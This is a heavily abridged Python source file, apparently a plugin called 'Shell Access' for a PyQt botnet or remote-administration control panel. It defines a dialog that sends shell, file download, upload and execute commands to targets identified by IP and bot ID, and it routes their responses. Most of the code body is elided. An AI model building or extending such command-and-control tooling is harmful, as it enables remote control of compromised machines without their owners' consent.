...
plugin_info = {
    'name': 'Shell Access',
    'priority': 40,
    'handled_types': ['shell_response', 'download_response', 'upload_response', 'execute_response']
}

class ShellAccessDialog(QDialog):
    # Emit target when dialog is closed
    closed = pyqtSignal(str)

    def __init__(self, gui, target="all", current_dir="", transport=None):
        super().__init__(gui)
        ...
        if command_text:
            ...
            try:
                if self.transport:
                    ...
                    print("ShellAccessDialog: no transport available to send shell command")
            except Exception as e:
                print(f"ShellAccessDialog transport error: {e}")
    ...
    def closeEvent(self, event):
        # notify plugin that dialog closed
        try:
    ...
    def download_file(self, file_name):
        ...
        try:
            if self.transport:
                ...
                print("ShellAccessDialog: no transport available to send download command")
        except Exception as e:
            print(f"ShellAccessDialog transport error: {e}")
            ...
            try:
                ...
                try:
                    if self.transport:
                        ...
                        print("ShellAccessDialog: no transport available to send upload command")
                except Exception as e:
                    print(f"ShellAccessDialog transport error: {e}")
    ...
    def execute_file(self, file_name):
        ...
        try:
            if self.transport:
                ...
                print("ShellAccessDialog: no transport available to send execute command")
        except Exception as e:
            print(f"ShellAccessDialog transport error: {e}")
...
class ShellAccessPlugin(BasePlugin):
    ...
    def execute(self, target):
        ...
        dialog = ShellAccessDialog(self.parent, target, current_dir, transport=getattr(self.parent, 'transport', None))
        # Show modeless dialog and keep a reference
    ...
    def handle_response(self, data):
        if data.get('type') == 'shell_response':
            ip = data['ip']
            bot_id = data['id']
            # Resolve target and update either a specific dialog or a global 'all' dialog
            target = f"{ip}:{bot_id}"
            dialog = self.dialogs.get(target) or self.dialogs.get('all')
            # If no exact match, try matching dialogs by bot_id suffix
            if dialog is None:
                for t in list(self.dialogs.keys()):
                    try:
                        ...
                        continue
            print(f"ShellAccessPlugin handle_response: resolved target={target}, dialog found={dialog is not None}")
            if dialog:
                try:
                    self.current_dirs[target] = data.get('current_dir', dialog.current_dir)
                except Exception:
                    self.current_dirs[target] = data.get('current_dir', '')
